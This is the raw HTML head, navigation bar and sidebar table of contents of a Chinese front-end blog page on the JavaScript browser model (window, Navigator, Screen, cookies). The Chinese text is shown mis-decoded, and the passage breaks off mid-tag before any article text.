<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>æµè§ˆå™¨æ¨¡å‹ | Jennifer&#39;s blog</title>
    <meta name="generator" content="VuePress 1.5.0">
    <link rel="icon" href="/img/logo.jpg">
    <meta name="description" content="webå‰ç«¯æŠ€æœ¯åšå®¢,ä¸“æ³¨webå‰ç«¯å­¦ä¹ ä¸æ€»ç»“ã€‚JavaScript,js,ES6,TypeScript,vue,python,css3,html5,Node,git,githubç­‰æŠ€æœ¯æ–‡ç« ã€‚">
    <meta name="keywords" content="å‰ç«¯åšå®¢,ä¸ªäººæŠ€æœ¯åšå®¢,å‰ç«¯,å‰ç«¯å¼€å‘,å‰ç«¯æ¡†æ¶,webå‰ç«¯,å‰ç«¯é¢è¯•é¢˜,æŠ€æœ¯æ–‡æ¡£,å­¦ä¹ ,é¢è¯•,JavaScript,js,ES6,TypeScript,vue,python,css3,html5,Node,git,github,markdown">
    <meta name="baidu-site-verification" content="7F55weZDDc">
    <meta name="theme-color" content="#42b983">
    <link rel="preload" href="/assets/css/0.styles.50ca47be.css" as="style"><link rel="preload" href="/assets/js/app.20513e73.js" as="script"><link rel="preload" href="/assets/js/2.b1ded945.js" as="script"><link rel="preload" href="/assets/js/126.6fbc34b9.js" as="script"><link rel="prefetch" href="/assets/js/10.aa4f3eef.js"><link rel="prefetch" href="/assets/js/100.d5621ce0.js"><link rel="prefetch" href="/assets/js/101.ee4e4dfc.js"><link rel="prefetch" href="/assets/js/102.61337a3b.js"><link rel="prefetch" href="/assets/js/103.e1347189.js"><link rel="prefetch" href="/assets/js/104.ee022d1f.js"><link rel="prefetch" href="/assets/js/105.cf8631c9.js"><link rel="prefetch" href="/assets/js/106.df315534.js"><link rel="prefetch" href="/assets/js/107.54048a76.js"><link rel="prefetch" href="/assets/js/108.d467c1e5.js"><link rel="prefetch" href="/assets/js/109.1b04c2c1.js"><link rel="prefetch" href="/assets/js/11.7c8f7729.js"><link rel="prefetch" href="/assets/js/110.86f49b51.js"><link rel="prefetch" href="/assets/js/111.4d4ffdee.js"><link rel="prefetch" href="/assets/js/112.78bb32c1.js"><link rel="prefetch" href="/assets/js/113.adf55024.js"><link rel="prefetch" href="/assets/js/114.0970e7d2.js"><link rel="prefetch" href="/assets/js/115.c2c0b7ee.js"><link rel="prefetch" href="/assets/js/116.796ae029.js"><link rel="prefetch" href="/assets/js/117.2a40c100.js"><link rel="prefetch" href="/assets/js/118.961bdaa7.js"><link rel="prefetch" href="/assets/js/119.f5bdfd3d.js"><link rel="prefetch" href="/assets/js/12.15683267.js"><link rel="prefetch" href="/assets/js/120.7047151f.js"><link rel="prefetch" href="/assets/js/121.b635fe56.js"><link rel="prefetch" href="/assets/js/122.912291a0.js"><link rel="prefetch" href="/assets/js/123.59a6d2b8.js"><link rel="prefetch" href="/assets/js/124.5bdd0185.js"><link rel="prefetch" href="/assets/js/125.2307f89c.js"><link rel="prefetch" href="/assets/js/127.d8d4abb9.js"><link rel="prefetch" href="/assets/js/128.c668f73b.js"><link rel="prefetch" href="/assets/js/129.0f75bb47.js"><link rel="prefetch" href="/assets/js/13.6a51d8ab.js"><link rel="prefetch" href="/assets/js/130.517d166c.js"><link rel="prefetch" href="/assets/js/131.4c7fbe0e.js"><link rel="prefetch" href="/assets/js/132.ebc66644.js"><link rel="prefetch" href="/assets/js/133.3902e49c.js"><link rel="prefetch" href="/assets/js/134.67735bc5.js"><link rel="prefetch" href="/assets/js/135.6abc73dd.js"><link rel="prefetch" href="/assets/js/136.f996e7f5.js"><link rel="prefetch" href="/assets/js/137.60151817.js"><link rel="prefetch" href="/assets/js/138.192d9555.js"><link rel="prefetch" href="/assets/js/139.9e68c324.js"><link rel="prefetch" href="/assets/js/14.df41c602.js"><link rel="prefetch" href="/assets/js/140.64dcb191.js"><link rel="prefetch" href="/assets/js/141.c3ed3431.js"><link rel="prefetch" href="/assets/js/142.479668b4.js"><link rel="prefetch" href="/assets/js/143.1644668b.js"><link rel="prefetch" href="/assets/js/144.6454afda.js"><link rel="prefetch" href="/assets/js/145.bed8a3e0.js"><link rel="prefetch" href="/assets/js/146.8b722876.js"><link rel="prefetch" href="/assets/js/147.68f2659b.js"><link rel="prefetch" href="/assets/js/148.1970fdf1.js"><link rel="prefetch" href="/assets/js/149.75fbf528.js"><link rel="prefetch" href="/assets/js/15.1fba66d1.js"><link rel="prefetch" href="/assets/js/150.d0627137.js"><link rel="prefetch" href="/assets/js/151.ddb11427.js"><link rel="prefetch" href="/assets/js/152.aa630adb.js"><link rel="prefetch" href="/assets/js/153.89739027.js"><link rel="prefetch" href="/assets/js/154.76db2352.js"><link rel="prefetch" href="/assets/js/155.c36e8c58.js"><link rel="prefetch" href="/assets/js/156.335e26ed.js"><link rel="prefetch" href="/assets/js/157.a7d30e95.js"><link rel="prefetch" href="/assets/js/158.c2ac3dd9.js"><link rel="prefetch" href="/assets/js/159.a337eadf.js"><link rel="prefetch" href="/assets/js/16.2d84f76c.js"><link rel="prefetch" href="/assets/js/160.2e3c1bb2.js"><link rel="prefetch" href="/assets/js/161.f0b336ff.js"><link rel="prefetch" href="/assets/js/162.6bf01298.js"><link rel="prefetch" href="/assets/js/163.a0e24eaa.js"><link rel="prefetch" href="/assets/js/164.81e66d06.js"><link rel="prefetch" href="/assets/js/165.fa720391.js"><link rel="prefetch" href="/assets/js/166.d1001f7b.js"><link rel="prefetch" href="/assets/js/167.a2457660.js"><link rel="prefetch" href="/assets/js/168.ba247f26.js"><link rel="prefetch" href="/assets/js/169.0a633a75.js"><link rel="prefetch" href="/assets/js/17.d5cc4aa7.js"><link rel="prefetch" href="/assets/js/170.a71120e6.js"><link rel="prefetch" href="/assets/js/171.dbc9a100.js"><link rel="prefetch" href="/assets/js/172.fe22c9d8.js"><link rel="prefetch" href="/assets/js/173.c1b4302e.js"><link rel="prefetch" href="/assets/js/174.aea105e8.js"><link rel="prefetch" href="/assets/js/175.24b728fb.js"><link rel="prefetch" href="/assets/js/176.4c1a1adc.js"><link rel="prefetch" href="/assets/js/177.e7892374.js"><link rel="prefetch" href="/assets/js/178.954df270.js"><link rel="prefetch" href="/assets/js/179.b4388b7a.js"><link rel="prefetch" href="/assets/js/18.bfbdaa4d.js"><link rel="prefetch" href="/assets/js/180.e63bb1e8.js"><link rel="prefetch" href="/assets/js/181.be7ce868.js"><link rel="prefetch" href="/assets/js/182.a3efb3e9.js"><link rel="prefetch" href="/assets/js/183.bc9538cb.js"><link rel="prefetch" href="/assets/js/184.4d41a1b9.js"><link rel="prefetch" href="/assets/js/185.a2ddd10f.js"><link rel="prefetch" href="/assets/js/186.3a0f6e56.js"><link rel="prefetch" href="/assets/js/187.78957c13.js"><link rel="prefetch" href="/assets/js/188.30d73392.js"><link rel="prefetch" href="/assets/js/189.90b45352.js"><link rel="prefetch" href="/assets/js/19.af36a3fa.js"><link rel="prefetch" href="/assets/js/190.dccde486.js"><link rel="prefetch" href="/assets/js/191.b7ec8f54.js"><link rel="prefetch" href="/assets/js/192.58429b93.js"><link rel="prefetch" href="/assets/js/193.01e4f97d.js"><link rel="prefetch" href="/assets/js/194.c3604872.js"><link rel="prefetch" href="/assets/js/195.c54700d6.js"><link rel="prefetch" href="/assets/js/20.48b9690d.js"><link rel="prefetch" href="/assets/js/21.506c808d.js"><link rel="prefetch" href="/assets/js/22.d5fc6ebc.js"><link rel="prefetch" href="/assets/js/23.ddf7eba7.js"><link rel="prefetch" href="/assets/js/24.9ac155fc.js"><link rel="prefetch" href="/assets/js/25.4ba39836.js"><link rel="prefetch" href="/assets/js/26.b28ff8ed.js"><link rel="prefetch" href="/assets/js/27.8a114708.js"><link rel="prefetch" href="/assets/js/28.10258a13.js"><link rel="prefetch" href="/assets/js/29.15363aaa.js"><link rel="prefetch" href="/assets/js/3.5b6b8270.js"><link rel="prefetch" href="/assets/js/30.d65f1b02.js"><link rel="prefetch" href="/assets/js/31.f3b8dfdc.js"><link rel="prefetch" href="/assets/js/32.fe452cf3.js"><link rel="prefetch" href="/assets/js/33.6cae69ff.js"><link rel="prefetch" href="/assets/js/34.540516c6.js"><link rel="prefetch" href="/assets/js/35.dfe7994b.js"><link rel="prefetch" href="/assets/js/36.3670fc06.js"><link rel="prefetch" href="/assets/js/37.cf6ba9a6.js"><link rel="prefetch" href="/assets/js/38.259923d3.js"><link rel="prefetch" href="/assets/js/39.1944a5f4.js"><link rel="prefetch" href="/assets/js/4.4b09dbdf.js"><link rel="prefetch" href="/assets/js/40.0874853c.js"><link rel="prefetch" href="/assets/js/41.cfde1da0.js"><link rel="prefetch" href="/assets/js/42.65b749a6.js"><link rel="prefetch" href="/assets/js/43.70a36993.js"><link rel="prefetch" href="/assets/js/44.e493362e.js"><link rel="prefetch" href="/assets/js/45.34d672a6.js"><link rel="prefetch" href="/assets/js/46.511235b0.js"><link rel="prefetch" href="/assets/js/47.d57e0910.js"><link rel="prefetch" href="/assets/js/48.83b3de62.js"><link rel="prefetch" href="/assets/js/49.897c49b2.js"><link rel="prefetch" href="/assets/js/5.382c18db.js"><link rel="prefetch" href="/assets/js/50.4f87f0b3.js"><link rel="prefetch" href="/assets/js/51.f44f00b4.js"><link rel="prefetch" href="/assets/js/52.df8f1326.js"><link rel="prefetch" href="/assets/js/53.aa4db494.js"><link rel="prefetch" href="/assets/js/54.de3c9afa.js"><link rel="prefetch" href="/assets/js/55.5e35da4f.js"><link rel="prefetch" href="/assets/js/56.fe7b7717.js"><link rel="prefetch" href="/assets/js/57.961e324d.js"><link rel="prefetch" href="/assets/js/58.c61bface.js"><link rel="prefetch" href="/assets/js/59.99294077.js"><link rel="prefetch" href="/assets/js/6.2a90043d.js"><link rel="prefetch" href="/assets/js/60.49caaef9.js"><link rel="prefetch" href="/assets/js/61.d21fded5.js"><link rel="prefetch" href="/assets/js/62.20179217.js"><link rel="prefetch" href="/assets/js/63.ab9bdff0.js"><link rel="prefetch" href="/assets/js/64.61e2a805.js"><link rel="prefetch" href="/assets/js/65.e756b9f6.js"><link rel="prefetch" href="/assets/js/66.23d5ccf4.js"><link rel="prefetch" href="/assets/js/67.ebc8fcee.js"><link rel="prefetch" href="/assets/js/68.0318b180.js"><link rel="prefetch" href="/assets/js/69.3d509103.js"><link rel="prefetch" href="/assets/js/7.5cf16d6d.js"><link rel="prefetch" href="/assets/js/70.932841a3.js"><link rel="prefetch" href="/assets/js/71.1633d6d5.js"><link rel="prefetch" href="/assets/js/72.2b3569b6.js"><link rel="prefetch" href="/assets/js/73.35bf1366.js"><link rel="prefetch" href="/assets/js/74.f09f510d.js"><link rel="prefetch" href="/assets/js/75.b53ec370.js"><link rel="prefetch" href="/assets/js/76.a870d6b4.js"><link rel="prefetch" href="/assets/js/77.8f6d18cf.js"><link rel="prefetch" href="/assets/js/78.4837cbda.js"><link rel="prefetch" href="/assets/js/79.34f27505.js"><link rel="prefetch" href="/assets/js/8.6c73b42b.js"><link rel="prefetch" href="/assets/js/80.f9a84482.js"><link rel="prefetch" href="/assets/js/81.8fa65d04.js"><link rel="prefetch" href="/assets/js/82.00f14593.js"><link rel="prefetch" href="/assets/js/83.265de29c.js"><link rel="prefetch" href="/assets/js/84.f660a9d5.js"><link rel="prefetch" href="/assets/js/85.91d9dc3d.js"><link rel="prefetch" href="/assets/js/86.b72fa7ab.js"><link rel="prefetch" href="/assets/js/87.f8ff65fb.js"><link rel="prefetch" href="/assets/js/88.d1b4a0c3.js"><link rel="prefetch" href="/assets/js/89.fe3327c8.js"><link rel="prefetch" href="/assets/js/9.17131428.js"><link rel="prefetch" href="/assets/js/90.cec2b86b.js"><link rel="prefetch" href="/assets/js/91.bb0327a9.js"><link rel="prefetch" href="/assets/js/92.dcecade6.js"><link rel="prefetch" href="/assets/js/93.c05f1bb1.js"><link rel="prefetch" href="/assets/js/94.f00c14e0.js"><link rel="prefetch" href="/assets/js/95.7661018a.js"><link rel="prefetch" href="/assets/js/96.e0500546.js"><link rel="prefetch" href="/assets/js/97.de26d9af.js"><link rel="prefetch" href="/assets/js/98.53bd30d7.js"><link rel="prefetch" href="/assets/js/99.6c385c01.js">
    <link rel="stylesheet" href="/assets/css/0.styles.50ca47be.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu have-body-img"><header class="navbar blur"><div title="ç›®å½•" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/logo.jpg" alt="Jennifer's blog" class="logo"> <span class="site-name can-hide">Jennifer's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">é¦–é¡µ</a></div><div class="nav-item"><a href="/pages/bd0236/" class="nav-link">â˜€ï¸åŸºç¡€</a></div><div class="nav-item"><a href="/pages/ee57da/" class="nav-link">ğŸŒˆJS</a></div><div class="nav-item"><a href="/pages/96f355/" class="nav-link">ğŸµå‰ç«¯</a></div><div class="nav-item"><a href="/pages/93f830/" class="nav-link">ğŸ°ç¬”è®°</a></div><div class="nav-item"><a href="/pages/b5612f/" class="nav-link">ğŸ¿æŠ€æœ¯</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="ğŸ§€æ”¶è—" class="dropdown-title"><a href="/pages/beb6c0bd8a66cea6/" class="link-title">ğŸ§€æ”¶è—</a> <span class="title" style="display:none;">ğŸ§€æ”¶è—</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/beb6c0bd8a66cea6/" class="nav-link">ç½‘ç«™</a></li><li class="dropdown-item"><!----> <a href="/pages/eee83a9211a70f9d/" class="nav-link">èµ„æº</a></li><li class="dropdown-item"><!----> <a href="/pages/12df8ace52d493f6/" class="nav-link">Vueèµ„æº</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="ğŸ¥ç´¢å¼•" class="dropdown-title"><a href="/archives/" class="link-title">ğŸ¥ç´¢å¼•</a> <span class="title" style="display:none;">ğŸ¥ç´¢å¼•</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">åˆ†ç±»</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">æ ‡ç­¾</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">å½’æ¡£</a></li></ul></div></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="/img/logo.jpg"> <div class="blogger-info"><h3>Jennifer</h3> <span>
        æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ˜Ÿè¾°å¤§æµ·
      </span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">é¦–é¡µ</a></div><div class="nav-item"><a href="/pages/bd0236/" class="nav-link">â˜€ï¸åŸºç¡€</a></div><div class="nav-item"><a href="/pages/ee57da/" class="nav-link">ğŸŒˆJS</a></div><div class="nav-item"><a href="/pages/96f355/" class="nav-link">ğŸµå‰ç«¯</a></div><div class="nav-item"><a href="/pages/93f830/" class="nav-link">ğŸ°ç¬”è®°</a></div><div class="nav-item"><a href="/pages/b5612f/" class="nav-link">ğŸ¿æŠ€æœ¯</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="ğŸ§€æ”¶è—" class="dropdown-title"><a href="/pages/beb6c0bd8a66cea6/" class="link-title">ğŸ§€æ”¶è—</a> <span class="title" style="display:none;">ğŸ§€æ”¶è—</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/beb6c0bd8a66cea6/" class="nav-link">ç½‘ç«™</a></li><li class="dropdown-item"><!----> <a href="/pages/eee83a9211a70f9d/" class="nav-link">èµ„æº</a></li><li class="dropdown-item"><!----> <a href="/pages/12df8ace52d493f6/" class="nav-link">Vueèµ„æº</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="ğŸ¥ç´¢å¼•" class="dropdown-title"><a href="/archives/" class="link-title">ğŸ¥ç´¢å¼•</a> <span class="title" style="display:none;">ğŸ¥ç´¢å¼•</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">åˆ†ç±»</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">æ ‡ç­¾</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">å½’æ¡£</a></li></ul></div></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>Javascripté˜®ä¸€å³°</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/ac9e47/" class="sidebar-link">Javascripté˜®ä¸€å³°æ€ç»´å¯¼å›¾</a></li><li><a href="/pages/93f830/" class="sidebar-link">å…¥é—¨</a></li><li><a href="/pages/057951/" class="sidebar-link">æ•°æ®ç±»å‹</a></li><li><a href="/pages/bccc77/" class="sidebar-link">è¿ç®—ç¬¦</a></li><li><a href="/pages/6f694f/" class="sidebar-link">è¯­æ³•ä¸“é¢˜</a></li><li><a href="/pages/a52a1a/" class="sidebar-link">æ ‡å‡†åº“</a></li><li><a href="/pages/1bc80d/" class="sidebar-link">é¢å‘å¯¹è±¡ç¼–ç¨‹</a></li><li><a href="/pages/6f4cd5/" class="sidebar-link">å¼‚æ­¥æ“ä½œ</a></li><li><a href="/pages/160069/" class="sidebar-link">DOM</a></li><li><a href="/pages/337d30/" class="sidebar-link">äº‹ä»¶</a></li><li><a href="/pages/eea84c/" aria-current="page" class="active sidebar-link">æµè§ˆå™¨æ¨¡å‹</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#ä¸€ã€æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°" class="sidebar-link">ä¸€ã€æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_1-ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•" class="sidebar-link">1.ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#script-å…ƒç´ åµŒå…¥ä»£ç " class="sidebar-link">script å…ƒç´ åµŒå…¥ä»£ç </a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#script-å…ƒç´ åŠ è½½å¤–éƒ¨è„šæœ¬" class="sidebar-link">script å…ƒç´ åŠ è½½å¤–éƒ¨è„šæœ¬</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#äº‹ä»¶å±æ€§" class="sidebar-link">äº‹ä»¶å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#url-åè®®" class="sidebar-link">URL åè®®</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_2-script-å…ƒç´ " class="sidebar-link">2.script å…ƒç´ </a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#å·¥ä½œåŸç†" class="sidebar-link">å·¥ä½œåŸç†</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#defer-å±æ€§" class="sidebar-link">defer å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#async-å±æ€§" class="sidebar-link">async å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#è„šæœ¬çš„åŠ¨æ€åŠ è½½" class="sidebar-link">è„šæœ¬çš„åŠ¨æ€åŠ è½½</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#åŠ è½½ä½¿ç”¨çš„åè®®" class="sidebar-link">åŠ è½½ä½¿ç”¨çš„åè®®</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_3-æµè§ˆå™¨çš„ç»„æˆ" class="sidebar-link">3.æµè§ˆå™¨çš„ç»„æˆ</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#æ¸²æŸ“å¼•æ“" class="sidebar-link">æ¸²æŸ“å¼•æ“</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#é‡æµå’Œé‡ç»˜" class="sidebar-link">é‡æµå’Œé‡ç»˜</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#javascript-å¼•æ“" class="sidebar-link">JavaScript å¼•æ“</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#äºŒã€window-å¯¹è±¡" class="sidebar-link">äºŒã€window å¯¹è±¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#æ¦‚è¿°" class="sidebar-link">æ¦‚è¿°</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_1-window-å¯¹è±¡çš„å±æ€§" class="sidebar-link">1.window å¯¹è±¡çš„å±æ€§</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-name" class="sidebar-link">window.name</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-closedï¼Œwindow-opener" class="sidebar-link">window.closedï¼Œwindow.opener</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-selfï¼Œwindow-window" class="sidebar-link">window.selfï¼Œwindow.window</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-framesï¼Œwindow-length" class="sidebar-link">window.framesï¼Œwindow.length</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-frameelement" class="sidebar-link">window.frameElement</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-topï¼Œwindow-parent" class="sidebar-link">window.topï¼Œwindow.parent</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-status" class="sidebar-link">window.status</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-devicepixelratio" class="sidebar-link">window.devicePixelRatio</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#ä½ç½®å¤§å°å±æ€§" class="sidebar-link">ä½ç½®å¤§å°å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#ç»„ä»¶å±æ€§" class="sidebar-link">ç»„ä»¶å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#å…¨å±€å¯¹è±¡å±æ€§" class="sidebar-link">å…¨å±€å¯¹è±¡å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-issecurecontext" class="sidebar-link">window.isSecureContext</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_2-window-å¯¹è±¡çš„æ–¹æ³•" class="sidebar-link">2.window å¯¹è±¡çš„æ–¹æ³•</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-alert-ï¼Œwindow-prompt-ï¼Œwindow-confirm" class="sidebar-link">window.alert()ï¼Œwindow.prompt()ï¼Œwindow.confirm()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-open-window-close-ï¼Œwindow-stop" class="sidebar-link">window.open(), window.close()ï¼Œwindow.stop()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-moveto-ï¼Œwindow-moveby" class="sidebar-link">window.moveTo()ï¼Œwindow.moveBy()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-resizeto-ï¼Œwindow-resizeby" class="sidebar-link">window.resizeTo()ï¼Œwindow.resizeBy()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-scrollto-ï¼Œwindow-scroll-ï¼Œwindow-scrollby" class="sidebar-link">window.scrollTo()ï¼Œwindow.scroll()ï¼Œwindow.scrollBy()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-print" class="sidebar-link">window.print()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-focus-ï¼Œwindow-blur" class="sidebar-link">window.focus()ï¼Œwindow.blur()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-getselection" class="sidebar-link">window.getSelection()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-getcomputedstyle-ï¼Œwindow-matchmedia" class="sidebar-link">window.getComputedStyle()ï¼Œwindow.matchMedia()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-requestanimationframe" class="sidebar-link">window.requestAnimationFrame()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-requestidlecallback" class="sidebar-link">window.requestIdleCallback()</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_3-äº‹ä»¶" class="sidebar-link">3.äº‹ä»¶</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#load-äº‹ä»¶å’Œ-onload-å±æ€§" class="sidebar-link">load äº‹ä»¶å’Œ onload å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#error-äº‹ä»¶å’Œ-onerror-å±æ€§" class="sidebar-link">error äº‹ä»¶å’Œ onerror å±æ€§</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-å¯¹è±¡çš„äº‹ä»¶ç›‘å¬å±æ€§" class="sidebar-link">window å¯¹è±¡çš„äº‹ä»¶ç›‘å¬å±æ€§</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_4-å¤šçª—å£æ“ä½œ" class="sidebar-link">4.å¤šçª—å£æ“ä½œ</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#çª—å£çš„å¼•ç”¨" class="sidebar-link">çª—å£çš„å¼•ç”¨</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#iframe-å…ƒç´ " class="sidebar-link">iframe å…ƒç´ </a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#window-frames-å±æ€§" class="sidebar-link">window.frames å±æ€§</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#ä¸‰ã€navigator-å¯¹è±¡ï¼Œscreen-å¯¹è±¡ã€‚" class="sidebar-link">ä¸‰ã€Navigator å¯¹è±¡ï¼ŒScreen å¯¹è±¡ã€‚</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_1-navigator-å¯¹è±¡çš„å±æ€§" class="sidebar-link">1.Navigator å¯¹è±¡çš„å±æ€§</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#navigator-useragent" class="sidebar-link">Navigator.userAgent</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#navigator-plugins" class="sidebar-link">Navigator.plugins</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#navigator-platform" class="sidebar-link">Navigator.platform</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#navigator-online" class="sidebar-link">Navigator.onLine</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#navigator-languageï¼Œnavigator-languages" class="sidebar-link">Navigator.languageï¼ŒNavigator.languages</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#navigator-geolocation" class="sidebar-link">Navigator.geolocation</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#navigator-cookieenabled" class="sidebar-link">Navigator.cookieEnabled</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_2-navigator-å¯¹è±¡çš„æ–¹æ³•" class="sidebar-link">2.Navigator å¯¹è±¡çš„æ–¹æ³•</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#navigator-javaenabled" class="sidebar-link">Navigator.javaEnabled()</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#navigator-sendbeacon" class="sidebar-link">Navigator.sendBeacon()</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_3-screen-å¯¹è±¡" class="sidebar-link">3.Screen å¯¹è±¡</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#å››ã€cookie" class="sidebar-link">å››ã€Cookie</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_1-æ¦‚è¿°" class="sidebar-link">1.æ¦‚è¿°</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_2-cookie-ä¸-http-åè®®" class="sidebar-link">2.Cookie ä¸ HTTP åè®®</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#http-å›åº”ï¼šcookie-çš„ç”Ÿæˆ" class="sidebar-link">HTTP å›åº”ï¼šCookie çš„ç”Ÿæˆ</a></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#http-è¯·æ±‚ï¼šcookie-çš„å‘é€" class="sidebar-link">HTTP è¯·æ±‚ï¼šCookie çš„å‘é€</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/eea84c/#_3-cookie-çš„å±æ€§" class="sidebar-link">3.Cookie çš„å±æ€§</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/eea84c/#expiresï¼Œmax-age" class="sidebar-link">Expiresï¼ŒMax-Age</a></li><li class="sidebar-sub-header"><a 